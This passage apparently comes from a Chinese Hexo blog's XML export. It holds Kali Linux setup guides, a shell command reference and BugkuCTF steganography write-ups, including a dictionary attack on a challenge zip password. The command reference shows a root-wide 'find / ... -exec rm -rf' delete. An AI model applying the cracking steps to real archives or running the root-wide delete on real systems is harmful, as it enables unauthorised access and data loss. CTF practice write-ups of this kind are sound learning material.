src="https://i.loli.net/2020/11/18/LC2yNAH1boZ47pU.png" alt="image-20201118202005823"></p><p><img src="https://i.loli.net/2020/11/18/IDyEQuATq85SnWj.png" alt="image-20201118202118646"></p><h3 id="安装Kali"><a href="#安装Kali" class="headerlink" title="安装Kali"></a>安装Kali</h3><p>（1）点击开启虚拟机</p><p><img src="https://i.loli.net/2020/11/18/ASMQzZ1RUPepvkX.png" alt="image-20201118202451736"></p><p>（2）再出现的页面里选择Graphical install，回车，进行GUI界面安装</p><p><img src="https://i.loli.net/2020/11/18/NZmAzXrL3S2HdBe.png" alt="image-20201118202651265"></p><p>（3）选择一种语言，这里我选择English，选好后点击continue</p><p><img src="https://i.loli.net/2020/11/18/QpMaZgdkzuIHoXS.png" alt="image-20201118202755157"></p><p>（4）选择国家、领地或地区</p><p><img src="https://i.loli.net/2020/11/20/lbFrZzvmwgCDYnW.png" alt="image-20201120124026274"></p><p>（5）选择键盘映射</p><p><img src="https://i.loli.net/2020/11/20/2avsNCjpUz4xcBV.png" alt="image-20201120124328490"></p><p>（6）稍等1分钟。填写主机名</p><p><img src="https://i.loli.net/2020/11/18/S8ypjUHImC7Lgds.png" alt="image-20201118203301686"></p><p>（7）填写域名，这里可不填</p><p><img src="https://i.loli.net/2020/11/18/fTXeW3Q9rFk8UaR.png" alt="image-20201118203351174"></p><p>（8）设置一个用户名来取代root执行非管理任务的普通用户账号，因为2020版本的kali系统打破了传统默认是root的默认账号。</p><p><img src="https://i.loli.net/2020/11/18/wX2eKgRrWLMvyup.png" alt="image-20201118203930694"></p><p>（9）这里会填入上一步的用户名，可改可不改，这里是在登录界面用的用户名。</p><p><img src="https://i.loli.net/2020/11/18/G4vhds7uL6WtT2F.png" alt="image-20201118204113340"></p><p>（10）输入密码，二次输入确认密码</p><p><img src="https://i.loli.net/2020/11/18/sXLcI6UMtRElZAr.png" alt="image-20201118204212719"></p><p>（11）稍等1到两分钟，选择时区</p><p><img src="https://i.loli.net/2020/11/18/B8RTg3AunV29rSw.png" alt="image-20201118204421448"></p><p>（12）进入磁盘分区选项，点击continue</p><p><img src="https://i.loli.net/2020/11/18/x9GhY3UWQiA5kjH.png" alt="image-20201118204704353"></p><p>（13）默认并一直点击continue，直到最后一项，选择“yes”，将改动写入磁盘</p><p><img src="https://i.loli.net/2020/11/20/BLOSzmAFR7cdjpn.png" alt="image-20201120124504208"></p><p>（14）稍等1分钟，进入配置软件包管理器。这里若没有http代理信息，可忽略，点击continue</p><p><img src="https://i.loli.net/2020/11/20/Feq3szcvNxDMw2E.png" alt="image-20201120124628480"></p><p><img src="https://i.loli.net/2020/11/18/yO9kegB2uZ6CYtX.png" alt="image-20201118205218688"></p><p>（15）默认即可，continue</p><p><img src="https://i.loli.net/2020/11/18/DhuOtkTaMrH27Sy.png" alt="image-20201118215722620"></p><p>（16）之后便是“选择并安装软件”，这里需要一点时间，安装完成后，便是将GRUB安装至硬盘，选择“yes”</p><p><img src="https://i.loli.net/2020/11/20/BgtskKXzbRdjPa2.png" alt="image-20201120122137530"></p><p>（17）选择/dev/sda</p><p><img src="https://i.loli.net/2020/11/20/rXnxbWyJYhfejLq.png" alt="image-20201120122345533"></p><p>（18）安装完成</p><p><img src="https://i.loli.net/2020/11/20/wj8yP64sCcK9ndh.png" alt="image-20201120122609322"></p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali中的文件/目录操作</title>
      <link href="2020/11/16/kali/kali%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C/"/>
      <url>2020/11/16/kali/kali%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="文件操作常见命令"><a href="#文件操作常见命令" class="headerlink" title="文件操作常见命令"></a>文件操作常见命令</h2><p>以下内容都是基于kali2020.1版本的，在此列出命令的一些常见使用参数及用法，若要获取详细的使用方法，在命令后面加上 –help即可查看，或者使用man也可查看命令的帮助文档</p><pre><code>命令 --helpman 命令</code></pre><h3 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h3><pre><code>cd dir             //进入一个目录dircd .               //验证&quot;.&quot;代表当前目录cd ..              //进入当前目录的上一级（cd ../.. 进入当前目录的上两级目录）cd -               //返回进入此目录之前所在的目录</code></pre><p><img src="https://i.loli.net/2020/11/17/QOJ7eMRVEADYHPC.png" alt="image-20201117193550828"></p><h3 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h3><p>显示当前所在的工作目录</p><p><img src="https://i.loli.net/2020/11/17/ASpWwGgIdYsPHbq.png" alt="image-20201117193616793"></p><h3 id="ls-参数-对象-显示目录中的文件"><a href="#ls-参数-对象-显示目录中的文件" class="headerlink" title="ls [参数] [对象]       显示目录中的文件"></a>ls [参数] [对象]       显示目录中的文件</h3><pre><code>-a               //显示所有文件（包含隐藏文件）-l               //显示文件或目录的详细信息-lh              //将文件大小以K为单位显示-i               //显示文件或目录的indoes</code></pre><p>这里直接使用’ll’命令，其效果和’ls -l’一样，但初次使用’ll’会报错，系统会提示未找到该命令。</p><p>解决方法：</p><p>（1）编辑以下文档</p><pre><code>vim ~/.bashrc     //进入编辑模式</code></pre><p>（2）将alias ll=’ls -l‘前面的注释符号#删掉，保存并退出编辑</p><p>（3）重启即可</p><p><img src="https://i.loli.net/2020/11/17/ewixY9GIWPm8qLX.png" alt="image-20201117200316254"></p><h3 id="touch，vi-创建文件"><a href="#touch，vi-创建文件" class="headerlink" title="touch，vi     创建文件"></a>touch，vi     创建文件</h3><pre><code>touch file            //立即生成文件，若文件存在，则更新文件的时间戳vi file               //必须要保存才能生成相应的文件</code></pre><h3 id="mkdir-dir-创建目录"><a href="#mkdir-dir-创建目录" class="headerlink" title="mkdir  dir    创建目录"></a>mkdir  dir    创建目录</h3><h3 id="rmdir-删除空目录"><a href="#rmdir-删除空目录" class="headerlink" title="rmdir            删除空目录"></a>rmdir            删除空目录</h3><pre><code>rmdir dir           //只能删除空目录</code></pre><p>若要删除非空目录：</p><pre><code>rm -rf dir</code></pre><h3 id="cp-参数-sou-dst-复制文件或目录"><a href="#cp-参数-sou-dst-复制文件或目录" class="headerlink" title="cp [参数] sou dst     复制文件或目录"></a>cp [参数] sou dst     复制文件或目录</h3><pre><code>cp file1 file2 /dir          //若sou为文件，dst为目录，则可复制多个文件到该目录，但要加上目录所在路径cp file1 file2               //若sou和dst均为文件，则将file1的内容复制到file2中cp -r dir1 dir2              //若sou和dst均为目录，则将dir2复制到dir1中，需要加上参数-r  </code></pre><h3 id="mv-sou-dst-重命名、移动文件"><a href="#mv-sou-dst-重命名、移动文件" class="headerlink" title="mv sou dst      重命名、移动文件"></a>mv sou dst      重命名、移动文件</h3><pre><code>mv file1 file2             //若sou和dst均为文件，则将file1重命名为file2mv file dir                //若sou为文件，dst为目录，则将file移动到目录dir中，且可以移动多个文件</code></pre><h3 id="rm-参数-删除文件或目录"><a href="#rm-参数-删除文件或目录" class="headerlink" title="rm [参数]         删除文件或目录"></a>rm [参数]         删除文件或目录</h3><pre><code>-i                 //删除之前系统会进行一次确认-r                 //递归删除，用于删除目录-f                 //强制删除，没有提示和确认</code></pre><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><pre><code>file file_name     //显示文件类型等基本信息</code></pre><h3 id="ln-s-target-link-name-建立文件或目录链接"><a href="#ln-s-target-link-name-建立文件或目录链接" class="headerlink" title="ln [-s] target link_name         建立文件或目录链接"></a>ln [-s] target link_name         建立文件或目录链接</h3><p>（1）target最好指定为绝对路径，可使用pwd命令快速地获取路径，在后面加上需要链接的文件或目录即可</p><p>（2）建立的链接相当于windows中的快捷方式，但和target文件有不同的inodes。</p><p><img src="https://i.loli.net/2020/11/17/eIcms43GCbuO9YZ.png" alt="image-20201117210654615"></p><p><img src="https://i.loli.net/2020/11/17/L7PSbIX1kYcOMEH.png" alt="image-20201117210722443"></p><h3 id="find-path-expr-在路径path中查找符合表达式expr的文件"><a href="#find-path-expr-在路径path中查找符合表达式expr的文件" class="headerlink" title="find [path] [expr]              在路径path中查找符合表达式expr的文件"></a>find [path] [expr]              在路径path中查找符合表达式expr的文件</h3><p>（1）以下为表达式内容</p><pre><code>-name flag         //查找文件名符合flag的文件，-iname忽略大小写-empty             //查找空文件-user root         //查找在系统中属于root这个用户的文件-group root        //查找在系统中属于root这个组的文件-amin -n           //查找系统中最后n分钟被访问的文件-atime -n          //查找系统中最后n天被访问的文件</code></pre><p>（2）查找相关文件，并执行相关命令</p><pre><code>//将查找到的文件执行command操作-exc command &#123;&#125; \;          | xargs commandeg://删除查找到的文件名符合flag的文件find / -name flag -exec rm -rf &#123;&#125; \;         find / -name flag | xargs rm -rf</code></pre><p>{}表示find搜索出来的每个文件</p><p>{}和\之间有空格，命令的结尾必须是”;“不要忘记最后的分号</p><p>“|”为管道符，即把前一个命令的输出作为后一个命令的输入</p><h2 id="压缩，解压缩命令"><a href="#压缩，解压缩命令" class="headerlink" title="压缩，解压缩命令"></a>压缩，解压缩命令</h2><h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><pre><code>tar cvf file.tar dir    //打包目录中的文件，后面也可跟多个文件tar xvf file.tar        //解包#tar是打包，不是压缩</code></pre><h3 id="gz"><a href="#gz" class="headerlink" title=".gz"></a>.gz</h3><pre><code>gzip file           //压缩gunzip file.gz      //解压gzip -d file.gz     //解压</code></pre><h3 id="tar-gz"><a href="#tar-gz" class="headerlink" title=".tar.gz"></a>.tar.gz</h3><pre><code>tar zcvf file.tar.gz dir //压缩tar zxvf file.tar.gz     //解压</code></pre><h3 id="bz2"><a href="#bz2" class="headerlink" title=".bz2"></a>.bz2</h3><pre><code>bzip2 (-z) file      //压缩，有无参数z都可bunzip2 file.bz2     //解压bzip2 -d file.bz2    //解压</code></pre><h3 id="tar-bz2"><a href="#tar-bz2" class="headerlink" title=".tar.bz2"></a>.tar.bz2</h3><pre><code>tar jcvf file.tar.bz2 dir   //压缩tar jxvf file.tar.bz2       //解压</code></pre><h3 id="zip"><a href="#zip" class="headerlink" title=".zip"></a>.zip</h3><pre><code>zip file.zip file/dir     //压缩文件或目录unzip file.zip            //解压</code></pre><h3 id="tgz"><a href="#tgz" class="headerlink" title=".tgz"></a>.tgz</h3><pre><code>tar zcvf file.tar.tgz file1 file2   //压缩tar zxvf file.tar.tgz      //解压</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali下root用户的配色问题</title>
      <link href="2020/11/15/kali/kali%E4%B8%8Broot%E7%94%A8%E6%88%B7%E7%9A%84%E9%85%8D%E8%89%B2%E9%97%AE%E9%A2%98/"/>
      <url>2020/11/15/kali/kali%E4%B8%8Broot%E7%94%A8%E6%88%B7%E7%9A%84%E9%85%8D%E8%89%B2%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>（1）在该文件夹中粘贴颜色配置：vim /root/.bashrc</p><pre><code class="javascript">vim /root/.bashrc</code></pre><p>（2）粘贴内容如下：</p><pre><code class="javascript"># set variable identifying the chroot you work in (used in the prompt below)if [ -z &quot;$&#123;debian_chroot:-&#125;&quot; ] &amp;&amp; [ -r /etc/debian_chroot ]; then    debian_chroot=$(cat /etc/debian_chroot)fi# set a fancy prompt (non-color, unless we know we &quot;want&quot; color)case &quot;$TERM&quot; in    xterm-color) color_prompt=yes;;esac# uncomment for a colored prompt, if the terminal has the capability; turned# off by default to not distract the user: the focus in a terminal window# should be on the output of commands, not on the promptforce_color_prompt=yesif [ -n &quot;$force_color_prompt&quot; ]; then    if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then    # We have color support; assume it&#39;s compliant with Ecma-48    # (ISO/IEC-6429). (Lack of such support is extremely rare, and such    # a case would tend to support setf rather than setaf.)    color_prompt=yes    else    color_prompt=    fifiif [ &quot;$color_prompt&quot; = yes ]; then    PS1=&#39;$&#123;debian_chroot:+($debian_chroot)&#125;\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#39;else    PS1=&#39;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$ &#39;fiunset color_prompt force_color_prompt# If this is an xterm set the title to user@host:dircase &quot;$TERM&quot; inxterm*|rxvt*)    PS1=&quot;\[\e]0;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h: \w\a\]$PS1&quot;    ;;*)    ;;esac# enable color support of ls and also add handy aliasesif [ -x /usr/bin/dircolors ]; then    test -r ~/.dircolors &amp;&amp; eval &quot;$(dircolors -b ~/.dircolors)&quot; || eval &quot;$(dircolors -b)&quot;    alias ls=&#39;ls --color=auto&#39;    #alias dir=&#39;dir --color=auto&#39;    #alias vdir=&#39;vdir --color=auto&#39;    #alias grep=&#39;grep --color=auto&#39;    #alias fgrep=&#39;fgrep --color=auto&#39;    #alias egrep=&#39;egrep --color=auto&#39;fi# some more ls aliases#alias ll=&#39;ls -l&#39;#alias la=&#39;ls -A&#39;#alias l=&#39;ls -CF&#39;# Alias definitions.# You may want to put all your additions into a separate file like# ~/.bash_aliases, instead of adding them here directly.# See /usr/share/doc/bash-doc/examples in the bash-doc package.if [ -f ~/.bash_aliases ]; then    . ~/.bash_aliasesfi# enable programmable completion features (you don&#39;t need to enable# this, if it&#39;s already enabled in /etc/bash.bashrc and /etc/profile# sources /etc/bash.bashrc).if ! shopt -oq posix; then  if [ -f /usr/share/bash-completion/bash_completion ]; then    . /usr/share/bash-completion/bash_completion  elif [ -f /etc/bash_completion ]; then    . /etc/bash_completion  fifi</code></pre><p>（3）执行命令source /root/.bashrc即可</p><pre><code class="javascript">source /root/.bashrc</code></pre><p>（4）配置前：</p><p><img src="https://i.loli.net/2020/11/15/kmhGaFQ2cq5uB7O.png" alt="image-20201115235207538"></p><p>（5）配置后：</p><p><img src="https://i.loli.net/2020/11/15/QBd9eWJRlyckqts.png" alt="image-20201115235233882"></p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装kali后修改系统时间</title>
      <link href="2020/11/15/kali/%E5%AE%89%E8%A3%85kali%E5%90%8E%E4%BF%AE%E6%94%B9%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4/"/>
      <url>2020/11/15/kali/%E5%AE%89%E8%A3%85kali%E5%90%8E%E4%BF%AE%E6%94%B9%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<p>（1）tzselect命令执行</p><pre><code>tzselect</code></pre><p><img src="https://i.loli.net/2020/11/15/obZ6UA8tWxnidGH.png" alt="image-20201115232743756"></p><p>（2）依次选择Asia - China - Beijing Time - Yes，只要输入选项前面的数字即可。</p><p><img src="https://i.loli.net/2020/11/15/QfUEhtYTjOB1GZp.png" alt="image-20201115233034860"></p><p>（3）修改配置文件，修改时区，输入以下命令</p><pre><code>echo &quot;ZONE=Asia/Shanghai&quot; &gt;&gt; /etc/sysconfigrm -f /etc/localtime             ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime    //链接到上海时区文件  </code></pre><p>（4）执行完毕后重启，即可看到系统修改时间已完成</p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF_Misc_006</title>
      <link href="2020/11/15/BugkuCTF/BugkuCTF_Misc-006/"/>
      <url>2020/11/15/BugkuCTF/BugkuCTF_Misc-006/</url>
      
        <content type="html"><![CDATA[<h2 id="听首音乐"><a href="#听首音乐" class="headerlink" title="听首音乐"></a>听首音乐</h2><p>（1）下载附件，是一个音频文件，用audacity工具打开<br><img src="https://img-blog.csdnimg.cn/20201114181337328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）波形图上有些东西，Ctrl+鼠标滚轮，放大，是莫尔斯电码<br><img src="https://img-blog.csdnimg.cn/20201114181702980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）得到….. -… -.-. —-. ..— ….. -…. ….- —-. -.-. -… —– .—- —.. —.. ..-. ….. ..— . -…. .—- –… -.. –… —– —-. ..— —-. .—- —-. .—- -.-.用在线工具解码，得到flag为5BC925649CB0188F52E617D70929191C，这里注意字母为大写，直接提交就可以。<br><img src="https://img-blog.csdnimg.cn/20201114181823245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> BugkuCTF_杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF_Misc_005</title>
      <link href="2020/11/15/BugkuCTF/BugkuCTF_Misc-005/"/>
      <url>2020/11/15/BugkuCTF/BugkuCTF_Misc-005/</url>
      
        <content type="html"><![CDATA[<h2 id="乌云邀请码"><a href="#乌云邀请码" class="headerlink" title="乌云邀请码"></a>乌云邀请码</h2><p>（1）下载附件，得到一张图片，notepad++打开，没有flag信息。再用stegsolve工具打开，发现plane0上面都有一串小黑点，选择Analyse 的Data Extract进行分析。<br><img src="https://img-blog.csdnimg.cn/20201104232409664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（2）勾选红绿蓝的0层，选择BGR模式，然后点击Preview，滚动条滑到最上，看到了flag。保存命名为1.txt，打开就是flag。<br><img src="https://img-blog.csdnimg.cn/20201104232714398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201104232725994.png#pic_center" alt="在这里插入图片描述"></p><h2 id="神秘的文件"><a href="#神秘的文件" class="headerlink" title="神秘的文件"></a>神秘的文件</h2><p>（1）下载附件，解压后还有一个压缩包。继续解压，但需要密码，直接暴力破解，破解不出来。换一个攻击类型，改为字典攻击，导入常用密码.txt，开始攻击。<br><img src="https://img-blog.csdnimg.cn/20201107181454181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201107181523294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）成功破解，密码为q1w2e3r4<br><img src="https://img-blog.csdnimg.cn/20201107181621538.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（3）解压成功后，得到一个docx文档，打开没有发现flag。<br><img src="https://img-blog.csdnimg.cn/20201107181812554.png#pic_center" alt="在这里插入图片描述"></p><p>（4）不过下面那行的红色下划线有点奇怪，应该还有字，只是字体颜色为白色，改为黑色看看。<br><img src="https://img-blog.csdnimg.cn/20201107181953703.png#pic_center" alt="在这里插入图片描述"></p><p>（5）提交错误，再把该docx文档放到kali下binwalk一下，发现还有其他文件，用foremost进行分离文件。（也可以使用binwalk分离文件）</p><pre><code>#apt-get install binwalk        //安装binwalk#binwalk 文件名                  //查看是否存在隐藏文件#foremost -t all 文件名       //分离文件#binwalk -e 文件名             //分离文件</code></pre><p><img src="https://img-blog.csdnimg.cn/20201107182721882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（6）分解后，又是一个压缩包，解压后在docProps里发现falg.txt，里面是base64，解码后得到flag。<br><img src="https://img-blog.csdnimg.cn/20201107182828889.png#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201107182856236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="论剑"><a href="#论剑" class="headerlink" title="论剑"></a>论剑</h2><p>（1）下载附件，得到一张图片<br><img src="https://img-blog.csdnimg.cn/20201109190942602.png#pic_center" alt="在这里插入图片描述"></p><p>（2）放到kali下binwalk一下，发现有两张图片，用foremost分解，又是两张一样的图片。<br><img src="https://img-blog.csdnimg.cn/20201109191156780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（3）将得到的两张图片用stegsolve合成一下，没有发现信息。<br>（4）再用notepad++打开三张图片，查看图片尺寸是否一样<br>（5）发现新得到的两张图片尺寸不一样，将其修改为一样<br><img src="https://img-blog.csdnimg.cn/2020110919192734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（6）查看图片，发现有两张图片携带了flag信息，但同样的部分却被遮挡住了<br><img src="https://img-blog.csdnimg.cn/20201109192108944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（7）原图片中一定还有隐藏的信息，继续在notepad++中查看，发现了一串特殊的二进制字符。<br><img src="https://img-blog.csdnimg.cn/20201109192727587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（8）将这串二进制字符转换成字符串<br><img src="https://img-blog.csdnimg.cn/20201109192823812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（9）得到mynameiskey!!!hhh，意思是“我的名字是密码”，应该还存在加密文件<br><img src="https://img-blog.csdnimg.cn/2020110919341721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（10）7z压缩包的文件头是37 7A BC AF 27 1C，与这串二进制后面的数字很像，将其改为7z压缩包的文件头，放到kali下binwalk一下<br><img src="https://img-blog.csdnimg.cn/20201109193651596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（11）确实存在一个7z的压缩包，用foremost分离文件，但奇怪的是这里我分离不出来。可以直接把原图片的后缀名改为.7z，解压<br><img src="https://img-blog.csdnimg.cn/20201109200530480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（12）依旧是一张图片，依旧修改图片尺寸<br><img src="https://img-blog.csdnimg.cn/20201109200600834.png#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201109201400718.png#pic_center" alt="在这里插入图片描述"></p><p>（13）结合之前获得的flag信息，用base16解码，得到flag<br><img src="https://img-blog.csdnimg.cn/20201109201554314.png#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/2020110920162984.png#pic_center" alt="在这里插入图片描述"></p><h2 id="图穷匕见"><a href="#图穷匕见" class="headerlink" title="图穷匕见"></a>图穷匕见</h2><p>（1）下载附件，是一张.jpg图片，binwalk一下，没发现flag信息。放到notepad++下，搜索图片结尾ff d9，在图片后面发现了一大串的特殊的数字。<br><img src="https://img-blog.csdnimg.cn/2020110923262426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（2）该串数字为16进制，将其转换为ASCII码，内容为一串坐标<br><img src="https://img-blog.csdnimg.cn/20201109232859612.png#pic_center" alt="在这里插入图片描述"></p><p>（3）放到记事本里，在“编辑”里选择“替换”，将(,)全部替换为空<br><img src="https://img-blog.csdnimg.cn/20201109233050561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201109233124704.png#pic_center" alt="在这里插入图片描述"></p><p>（4）保存后放到kali下，这里需要使用gnuplot工具</p><pre><code>atp-get install gnuplot            //安装gnuplot工具</code></pre><p><img src="https://img-blog.csdnimg.cn/20201109233437618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（5）得到一张二维码图片，扫描后得到flag<br><img src="https://img-blog.csdnimg.cn/20201109233517131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201109233642751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h2><p>（1）打开链接，是一大串二进制数字，编写代码，将其转换为八位一组，这里我用的C语言</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;    char a[]=&quot;输入这串二进制数字&quot;    int i=0;    char *p=a;    while(*p!=&#39;\0&#39;)&#123;        if(i%8==0)&#123;            if(i == 0)&#123;                printf(&quot;%c&quot;,*p);            &#125;            else&#123;                printf(&quot; %c&quot;,*p);            &#125;        &#125;        if(i%8!=0)&#123;            printf(&quot;%c&quot;,*p);        &#125;        i++;        p++;    &#125;    system(&quot;pause&quot;);    return 0;&#125; </code></pre><p>使用在线工具将其转换为十六进制。<a href="http://ctf.ssleye.com/jinzhi.html">http://ctf.ssleye.com/jinzhi.html</a><br><img src="https://img-blog.csdnimg.cn/20201114141308684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020111414134873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）发现十六进制的开头为52 61 72 21，显然是一个rar的压缩包。将这串十六进制数保存在一个文本文档里，用010 editor导入十六进制，另存为3.rar<br><img 